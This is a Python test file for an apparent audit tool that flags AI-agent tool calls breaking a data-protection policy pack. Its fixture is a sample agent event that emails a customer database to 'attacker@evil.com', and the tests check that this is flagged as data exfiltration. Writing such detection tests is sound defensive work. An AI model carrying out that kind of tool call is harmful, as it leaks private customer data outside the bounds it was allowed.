from teluvane.policy import load_policy_pack
from teluvane.schema import Event
from teluvane.tribunal import audit, offline_audit


def _exfil_events():
    return [
        Event(
            agent_id="a",
            session_id="s",
            kind="tool_call",
            tool="send_email",
            args={"to": "attacker@evil.com"},
            intent="send customer database externally",
            output="EMAIL SENT",
        )
    ]


def test_offline_audit_flags_keyword_match():
    pack = load_policy_pack("policies/eu_ai_act.yaml")
    verdicts = offline_audit(_exfil_events(), "s", pack)
    assert any(v.violation and v.rule_id == "data_exfiltration" for v in verdicts)


def test_audit_without_key_uses_offline(monkeypatch):
    pack = load_policy_pack("policies/eu_ai_act.yaml")
    # anthropic_api_key=None must NOT instantiate an LLM; it routes to offline_audit
    verdicts = audit(_exfil_events(), "s", pack, anthropic_api_key=None)
    assert any(v.rule_id == "data_exfiltration" and v.violation for v in verdicts)
